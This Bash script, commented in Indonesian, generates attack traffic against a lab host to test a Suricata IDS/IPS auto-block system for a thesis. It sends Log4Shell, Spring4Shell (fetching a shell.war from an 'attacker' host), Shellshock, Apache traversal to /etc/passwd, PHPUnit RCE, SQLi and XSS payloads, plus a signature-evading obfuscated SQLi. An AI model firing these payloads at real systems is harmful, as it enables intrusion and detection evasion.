#!/bin/bash
# ==============================================================================
# SuricataEVE - Automated Attack & Ground Truth Generator (atk.sh)
# Menghasilkan 10 Serangan Sukses (Terblokir - TP), Serangan Lolos (FN),
# dan Simulasi False Positive (FP) untuk Laporan Skripsi/Evaluasi IDS/IPS.
# ==============================================================================

TARGET="${TARGET:-192.168.216.128}"
IFACE="${IFACE:-eth0}"

# Definisi Warna Output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Pastikan hak akses root (dibutuhkan untuk binding IP virtual / ip addr)
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Error: Script ini harus dijalankan sebagai root (sudo ./atk.sh)${NC}"
  exit 1
fi

header() {
    echo -e "\n${BLUE}${BOLD}================================================================${NC}"
    echo -e "${CYAN}${BOLD} $1 ${NC}"
    echo -e "${BLUE}${BOLD}================================================================${NC}\n"
}

info() {
    echo -e "${YELLOW}[*]${NC} $1"
}

success() {
    echo -e "${GREEN}[+]${NC} $1"
}

atk() {
    echo -e "${RED}[!]${NC} $1"
}

# ------------------------------------------------------------------------------
# Manajemen IP Virtual (101 - 112) pada Antarmuka Jaringan
# ------------------------------------------------------------------------------
setup_ips() {
    info "Menyiapkan IP Virtual penyerang di interface ${IFACE} (101 - 112)..."
    for i in {101..112}; do
        ip addr add 192.168.216.$i/24 dev ${IFACE} 2>/dev/null
    done
    success "IP Virtual siap digunakan untuk pengujian."
}

cleanup_ips() {
    info "Membersihkan IP Virtual dari interface ${IFACE}..."
    for i in {101..112}; do
        ip addr del 192.168.216.$i/24 dev ${IFACE} 2>/dev/null
    done
    success "Semua IP Virtual telah dibersihkan."
}

# ------------------------------------------------------------------------------
# 10 SERANGAN CVE & EVE EXPLOIT (PASTI TERBLOKIR - TRUE POSITIVES)
# Masing-masing dikirim 3x agar memenuhi batas threshold auto-block.
# ------------------------------------------------------------------------------

do_1_log4shell() {
    header "1. CVE-2021-44228 (Log4Shell JNDI Injection) -> IP: .101"
    atk "Mengirim eksploitasi RCE Apache Log4j via User-Agent..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.101 \
            -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' \
            "http://${TARGET}/"
    done
    success "Selesai (3x request). IP 192.168.216.101 seharusnya TERBLOKIR!"
}

do_2_spring4shell() {
    header "2. CVE-2022-22965 (Spring4Shell DataBinder RCE) -> IP: .102"
    atk "Mengirim eksploitasi Spring Core classLoader..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.102 \
            -H "class.module.classLoader.URLs[0]=jar:http://attacker/shell.war!/" \
            "http://${TARGET}/"
    done
    success "Selesai (3x request). IP 192.168.216.102 seharusnya TERBLOKIR!"
}

do_3_shellshock() {
    header "3. CVE-2014-6271 (Shellshock Bash RCE) -> IP: .103"
    atk "Mengirim eksploitasi Bash Environment function..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.103 \
            -H "User-Agent: () { :;}; /bin/bash -c 'id'" \
            "http://${TARGET}/cgi-bin/test"
    done
    success "Selesai (3x request). IP 192.168.216.103 seharusnya TERBLOKIR!"
}

do_4_apache_traversal() {
    header "4. CVE-2021-41773 (Apache HTTP Path Traversal /etc/passwd) -> IP: .104"
    atk "Membaca /etc/passwd via exploit path traversal Apache..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.104 \
            "http://${TARGET}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    done
    success "Selesai (3x request). IP 192.168.216.104 seharusnya TERBLOKIR!"
}

do_5_sql_injection() {
    header "5. SQL Injection Attack (UNION SELECT Extraction) -> IP: .105"
    atk "Mengekstrak data database via SQL Injection klasik..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.105 \
            "http://${TARGET}/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cuser%28%29%23&Submit=Submit"
    done
    success "Selesai (3x request). IP 192.168.216.105 seharusnya TERBLOKIR!"
}

do_6_xss_reflected() {
    header "6. Cross-Site Scripting (XSS Reflected) -> IP: .106"
    atk "Mengirim payload XSS <script> ke web application..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.106 \
            "http://${TARGET}/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
    done
    success "Selesai (3x request). IP 192.168.216.106 seharusnya TERBLOKIR!"
}

do_7_php_rce() {
    header "7. PHP Unit Eval-Stdin RCE (CVE-2017-9841) -> IP: .107"
    atk "Mengirim eksploitasi eval-stdin PHPUnit..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.107 \
            -X POST --data '<?php system("id"); ?>' \
            "http://${TARGET}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    done
    success "Selesai (3x request). IP 192.168.216.107 seharusnya TERBLOKIR!"
}

do_8_scanner_morfeus() {
    header "8. Scanner Signature (muieblackcat / Morfeus) -> IP: .108"
    atk "Mengakses URI scanner jahat muieblackcat..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.108 \
            "http://${TARGET}/muieblackcat"
    done
    success "Selesai (3x request). IP 192.168.216.108 seharusnya TERBLOKIR!"
}

do_9_gobuster_bruteforce() {
    header "9. Automated Directory Brute Force (Gobuster) -> IP: .109"
    atk "Memalsukan scanner Gobuster..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.109 \
            -H "User-Agent: gobuster/3.1.0" \
            "http://${TARGET}/admin/"
    done
    success "Selesai (3x request). IP 192.168.216.109 seharusnya TERBLOKIR!"
}

do_10_http_trace() {
    header "10. HTTP TRACE Cross-Site Tracing (XST) -> IP: .110"
    atk "Mengirim method HTTP TRACE terlarang..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.110 \
            -X TRACE "http://${TARGET}/"
    done
    success "Selesai (3x request). IP 192.168.216.110 seharusnya TERBLOKIR!"
}

# ------------------------------------------------------------------------------
# SERANGAN LOLOS (FALSE NEGATIVE / JANGAN KEBLOKIR)
# ------------------------------------------------------------------------------
do_11_bypass_obfuscation() {
    header "11. [FALSE NEGATIVE] Serangan Obfuscation SQLi (Lolos) -> IP: .111"
    info "Serangan nyata tapi menggunakan teknik comment obfuscation agar lolos signature..."
    # Hanya kirim payload terselubung yang lolos dari signature ET Open
    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.111 \
        "http://${TARGET}/vulnerabilities/sqli/?id=1%20%2F%2A%2150000UNION%2A%2F%20%2F%2A%2150000SELECT%2A%2F%201%2Cuser%28%29&Submit=Submit"
    success "Terkirim. IP 192.168.216.111 LOLOS (TIDAK TERBLOKIR) sebagai False Negative!"
}

do_12_low_rate_stealth() {
    header "12. [FAILED MITIGATION] Serangan Lambat di Bawah Threshold -> IP: .112"
    info "Hanya dikirim 1x (di bawah threshold 3). Terdeteksi alert tapi tidak diblok..."
    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.112 \
        -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' \
        "http://${TARGET}/"
    success "Terkirim 1x. Alert masuk tapi IP 192.168.216.112 TIDAK DIBLOK (karena threshold=3)!"
}

# ------------------------------------------------------------------------------
# TRAFFIC NORMAL (SIMULASI FALSE POSITIVE & TRUE NEGATIVE)
# ------------------------------------------------------------------------------
do_13_normal_traffic() {
    header "13. [NORMAL TRAFFIC] Simulasi Akses Sah & False Positive"
    info "Kirim traffic pengguna sah biasa..."
    curl -s -o /dev/null "http://${TARGET}/index.php"
    curl -s -o /dev/null "http://${TARGET}/login.php"
    success "Traffic normal dikirim dari host penyerang."
}

do_run_all() {
    setup_ips
    info "Menjalankan seluruh 10 serangan instan + 2 skenario lolos/threshold..."
    
    # 10 Serangan yang Pasti Terblokir
    do_1_log4shell
    do_2_spring4shell
    do_3_shellshock
    do_4_apache_traversal
    do_5_sql_injection
    do_6_xss_reflected
    do_7_php_rce
    do_8_scanner_morfeus
    do_9_gobuster_bruteforce
    do_10_http_trace

    # 2 Serangan yang Sengaja Lolos / Tidak Terblokir
    do_11_bypass_obfuscation
    do_12_low_rate_stealth

    # Traffic Normal
    do_13_normal_traffic

    header "PENGUJIAN SELESAI!"
    echo -e "${GREEN}Hasil Pengujian:${NC}"
    echo -e " • ${BOLD}10 Serangan (IP .101 - .110)${NC} : Berhasil diblokir otomatis (True Positive)"
    echo -e " • ${BOLD}1 Serangan (IP .111)${NC}        : Lolos dari deteksi (False Negative / Obfuscation)"
    echo -e " • ${BOLD}1 Serangan (IP .112)${NC}        : Alert terpicu tapi tidak diblok (Low Rate < Threshold)"
    echo -e " • ${BOLD}Traffic Normal${NC}              : Terverifikasi"
    echo -e "\n${YELLOW}Langkah Selanjutnya:${NC}"
    echo -e "1. Cek iptables:  ${CYAN}docker exec auto_block iptables -n -L SURICATA_BLOCK${NC}"
    echo -e "2. Buat laporan:  ${CYAN}python3 report.py${NC}"
    echo -e "3. Buka browser:  ${CYAN}http://${TARGET}:8080/static/report_summary.html${NC}\n"
}

# ------------------------------------------------------------------------------
# Menu Interaktif
# ------------------------------------------------------------------------------
setup_ips

while true; do
    echo -e "\n${BLUE}${BOLD}=== SURICATA AUTOMATED ATTACK & EVALUATION SUITE ===${NC}"
    echo -e "Target Server: ${BOLD}http://${TARGET}${NC}\n"
    
    echo -e "  ${GREEN}[10 SERANGAN CVE & EKSPLOITASI - PASTI TERBLOKIR]${NC}"
    echo -e "  ${BOLD} 1${NC}) 🐚 CVE-2021-44228 Log4Shell JNDI      (IP: .101)"
    echo -e "  ${BOLD} 2${NC}) 🍃 CVE-2022-22965 Spring4Shell RCE    (IP: .102)"
    echo -e "  ${BOLD} 3${NC}) 💥 CVE-2014-6271  Shellshock Bash     (IP: .103)"
    echo -e "  ${BOLD} 4${NC}) 📂 CVE-2021-41773 Apache Traversal    (IP: .104)"
    echo -e "  ${BOLD} 5${NC}) 💉 SQL Injection UNION Extraction     (IP: .105)"
    echo -e "  ${BOLD} 6${NC}) ⚡ Cross-Site Scripting (XSS)         (IP: .106)"
    echo -e "  ${BOLD} 7${NC}) 🐘 CVE-2017-9841  PHPUnit RCE         (IP: .107)"
    echo -e "  ${BOLD} 8${NC}) 🐈 Morfeus Scanner (muieblackcat)     (IP: .108)"
    echo -e "  ${BOLD} 9${NC}) 🕷️  Gobuster Directory Brute Force     (IP: .109)"
    echo -e "  ${BOLD}10${NC}) 🔀 HTTP TRACE Method (XST)            (IP: .110)"
    echo ""
    echo -e "  ${YELLOW}[SKENARIO REALISTIS SKRIPSI - TIDAK 100%]${NC}"
    echo -e "  ${BOLD}11${NC}) 🥷 SQLi Obfuscation (Lolos / False Negative) (IP: .111)"
    echo -e "  ${BOLD}12${NC}) 🐢 Slow Stealth Attack (< Threshold)        (IP: .112)"
    echo -e "  ${BOLD}13${NC}) 🌐 Traffic Normal (Pengguna Sah)"
    echo ""
    echo -e "  ${CYAN}[EKSEKUSI SEMUA & UTILITAS]${NC}"
    echo -e "  ${BOLD} A${NC}) 🚀 JALANKAN SEMUA SEKALIGUS (Rekomendasi untuk Skripsi)"
    echo -e "  ${BOLD} C${NC}) 🧹 Bersihkan IP Virtual (${IFACE})"
    echo -e "  ${BOLD} 0${NC}) ❌ Keluar"
    echo ""
    read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih menu [0-13 / A / C]: " CHOICE

    case $CHOICE in
         1) do_1_log4shell ;;
         2) do_2_spring4shell ;;
         3) do_3_shellshock ;;
         4) do_4_apache_traversal ;;
         5) do_5_sql_injection ;;
         6) do_6_xss_reflected ;;
         7) do_7_php_rce ;;
         8) do_8_scanner_morfeus ;;
         9) do_9_gobuster_bruteforce ;;
        10) do_10_http_trace ;;
        11) do_11_bypass_obfuscation ;;
        12) do_12_low_rate_stealth ;;
        13) do_13_normal_traffic ;;
        [Aa]) do_run_all ;;
        [Cc]) cleanup_ips ;;
         0) cleanup_ips; echo "Keluar."; exit 0 ;;
         *) echo -e "${RED}Pilihan tidak valid!${NC}" ;;
    esac
done
